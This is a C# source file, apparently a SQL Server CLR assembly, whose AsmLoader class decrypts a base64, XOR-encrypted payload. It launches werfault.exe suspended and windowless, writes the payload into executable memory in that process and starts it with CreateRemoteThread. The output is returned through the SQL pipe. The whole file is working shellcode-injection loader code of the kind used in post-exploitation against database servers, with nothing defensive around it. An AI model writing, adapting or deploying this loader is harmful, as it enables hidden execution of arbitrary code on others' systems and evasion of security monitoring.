using Microsoft.SqlServer.Server;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace CLR_module;

public class AsmLoader
{
    [StructLayout(LayoutKind.Sequential)]
    public class SecurityAttributes
    {
        public int Length;

        public IntPtr lpSecurityDescriptor = IntPtr.Zero;

        public bool bInheritHandle;

        public SecurityAttributes()
        {
            Length = Marshal.SizeOf(this);
        }
    }

    public struct ProcessInformation
    {
        public IntPtr hProcess;

        public IntPtr hThread;

        public int dwProcessId;

        public int dwThreadId;
    }

    [Flags]
    public enum CreateProcessFlags : uint
    {
        DEBUG_PROCESS = 1u,
        DEBUG_ONLY_THIS_PROCESS = 2u,
        CREATE_SUSPENDED = 4u,
        DETACHED_PROCESS = 8u,
        CREATE_NEW_CONSOLE = 0x10u,
        NORMAL_PRIORITY_CLASS = 0x20u,
        IDLE_PRIORITY_CLASS = 0x40u,
        HIGH_PRIORITY_CLASS = 0x80u,
        REALTIME_PRIORITY_CLASS = 0x100u,
        CREATE_NEW_PROCESS_GROUP = 0x200u,
        CREATE_UNICODE_ENVIRONMENT = 0x400u,
        CREATE_SEPARATE_WOW_VDM = 0x800u,
        CREATE_SHARED_WOW_VDM = 0x1000u,
        CREATE_FORCEDOS = 0x2000u,
        BELOW_NORMAL_PRIORITY_CLASS = 0x4000u,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x8000u,
        INHERIT_PARENT_AFFINITY = 0x10000u,
        INHERIT_CALLER_PRIORITY = 0x20000u,
        CREATE_PROTECTED_PROCESS = 0x40000u,
        EXTENDED_STARTUPINFO_PRESENT = 0x80000u,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x100000u,
        PROCESS_MODE_BACKGROUND_END = 0x200000u,
        CREATE_BREAKAWAY_FROM_JOB = 0x1000000u,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x2000000u,
        CREATE_DEFAULT_ERROR_MODE = 0x4000000u,
        CREATE_NO_WINDOW = 0x8000000u,
        PROFILE_USER = 0x10000000u,
        PROFILE_KERNEL = 0x20000000u,
        PROFILE_SERVER = 0x40000000u,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000u
    }

    [StructLayout(LayoutKind.Sequential)]
    public class StartupInfo
    {
        public int cb;

        public IntPtr lpReserved = IntPtr.Zero;

        public IntPtr lpDesktop = IntPtr.Zero;

        public IntPtr lpTitle = IntPtr.Zero;

        public int dwX;

        public int dwY;

        public int dwXSize;

        public int dwYSize;

        public int dwXCountChars;

        public int dwYCountChars;

        public int dwFillAttribute;

        public int dwFlags;

        public short wShowWindow;

        public short cbReserved2;

        public IntPtr lpReserved2 = IntPtr.Zero;

        public IntPtr hStdInput = IntPtr.Zero;

        public IntPtr hStdOutput = IntPtr.Zero;

        public IntPtr hStdError = IntPtr.Zero;

        public StartupInfo()
        {
            cb = Marshal.SizeOf(this);
        }
    }

    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;

        public IntPtr lpSecurityDescriptor;

        public int bInheritHandle;
    }

    private static uint PAGE_EXECUTE_READWRITE = 64u;

    private static uint MEM_COMMIT = 4096u;

    private static int HANDLE_FLAG_INHERIT = 1;

    public static int STARTF_USESTDHANDLES = 256;

    public static long fix = 533504L;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateProcessA(string lpApplicationName, string lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, bool bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] StartupInfo lpStartupInfo, out ProcessInformation lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool PeekNamedPipe(IntPtr handle, byte[] buffer, int nBufferSize, ref int bytesRead, ref int bytesAvail, ref int BytesLeftThisMessage);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);

    [DllImport("kernel32")]
    public static extern int GetLastError();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(IntPtr hProcess, int uExitCode);

    public static byte[] X0r(byte[] cipher, byte[] key)
    {
        byte[] array = new byte[cipher.Length];
        for (int i = 0; i < cipher.Length; i++)
        {
            array[i] = (byte)(cipher[i] ^ key[i % key.Length]);
        }
        return array;
    }

    private static bool is64Bit()
    {
        if (IntPtr.Size == 4)
            return false;

        return true;
    }

    public static string loadAsmBin(string code, string xor_key)
    {
        //(string commandLine, byte[] asm, int readWait)
        string commandLine = "C:/Windows/System32/werfault.exe";
        int readWait = 10000;
        if (is64Bit())
        {
            SqlContext.Pipe.Send(String.Format("[+] X64."));
        }
        else
        {
            SqlContext.Pipe.Send(String.Format("[+] X86."));
        }
        SqlContext.Pipe.Send(String.Format("[+] Decrypting XOR encrypted binary using key '{0}'", xor_key));
        byte[] cipher = Convert.FromBase64String(code);
        byte[] xorKey = Convert.FromBase64String(xor_key);
        byte[] asm = X0r(cipher, xorKey);
        byte[] array = new byte[fix];
        new Random().NextBytes(array);
        byte[] array2 = new byte[asm.Length + fix];
        Array.Copy(array, array2, array.Length);
        Array.Copy(asm, 0L, array2, fix, asm.Length);
        asm = array2;
        int dwSize = asm.Length;
        StartupInfo startupInfo = new StartupInfo();
        startupInfo.dwFlags |= STARTF_USESTDHANDLES;
        startupInfo.cb = Marshal.SizeOf(startupInfo);
        IntPtr hReadPipe = IntPtr.Zero;
        IntPtr hWritePipe = IntPtr.Zero;
        SECURITY_ATTRIBUTES lpPipeAttributes = default(SECURITY_ATTRIBUTES);
        lpPipeAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
        lpPipeAttributes.bInheritHandle = 1;
        lpPipeAttributes.lpSecurityDescriptor = IntPtr.Zero;
        if (CreatePipe(ref hReadPipe, ref hWritePipe, ref lpPipeAttributes, 0))
        {
            SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
            startupInfo.hStdOutput = hWritePipe;
            if (CreateProcessA(null, commandLine, null, null, bInheritHandles: true, CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, startupInfo, out var lpProcessInformation) != IntPtr.Zero)
            {
                CloseHandle(hWritePipe);
                IntPtr hProcess = lpProcessInformation.hProcess;
                IntPtr intPtr = VirtualAllocEx(hProcess, new IntPtr(0), dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (intPtr != IntPtr.Zero)
                {
                    int lpNumberOfBytesWritten = 0;
                    if (WriteProcessMemory(hProcess, intPtr, asm, new IntPtr(asm.Length), lpNumberOfBytesWritten))
                    {
                        Thread.Sleep(200);
                        IntPtr intPtr2 = CreateRemoteThread(hProcess, IntPtr.Zero, 0u, new IntPtr(intPtr.ToInt64() + fix), IntPtr.Zero, 0u, IntPtr.Zero);
                        if (intPtr2 != IntPtr.Zero)
                        {
                            Thread.Sleep(150);
                            string @string = Encoding.Default.GetString(readFileAndWait(hReadPipe, readWait));
                            CloseHandle(hWritePipe);
                            CloseHandle(hReadPipe);
                            CloseHandle(hProcess);
                            CloseHandle(intPtr2);
                            return @string;
                        }
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hWritePipe);
                        CloseHandle(hReadPipe);
                        CloseHandle(hProcess);
                        return $"Cannot CreateRemoteThread errcode:{GetLastError()}\n";
                    }
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hWritePipe);
                    CloseHandle(hReadPipe);
                    CloseHandle(hProcess);
                    return $"Cannot WriteProcessMemory errcode:{GetLastError()}\n";
                }
                TerminateProcess(hProcess, 0);
                CloseHandle(hWritePipe);
                CloseHandle(hReadPipe);
                CloseHandle(hProcess);
                return $"Cannot alloc memory errcode:{GetLastError()}\n";
            }
            CloseHandle(hWritePipe);
            CloseHandle(hReadPipe);
            return $"Cannot create process errcode:{GetLastError()}\n";
        }
        return $"Cannot create pipe errcode:{GetLastError()}\n";
    }

    protected static byte[] readFileAndWait(IntPtr pipe, int timeout)
    {
        MemoryStream memoryStream = new MemoryStream();
        byte[] bytes = Encoding.Default.GetBytes("ok\n");
        memoryStream.Write(bytes, 0, bytes.Length);
        bytes = new byte[1024];
        FileStream fileStream = new FileStream(pipe, FileAccess.Read);
        long num = currentTimestamp();
        while (timeout + num > currentTimestamp())
        {
            int bytesRead = 0;
            int bytesAvail = 0;
            if (!PeekNamedPipe(pipe, bytes, bytes.Length, ref bytesRead, ref bytesAvail, ref bytesAvail))
            {
                break;
            }
            if (bytesRead > 0)
            {
                int count = fileStream.Read(bytes, 0, bytes.Length);
                memoryStream.Write(bytes, 0, count);
            }
            else
            {
                Thread.Sleep(50);
            }
        }
        fileStream.Dispose();
        return memoryStream.ToArray();
    }

    protected static long currentTimestamp()
    {
        return (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000L) / 10000;
    }
}
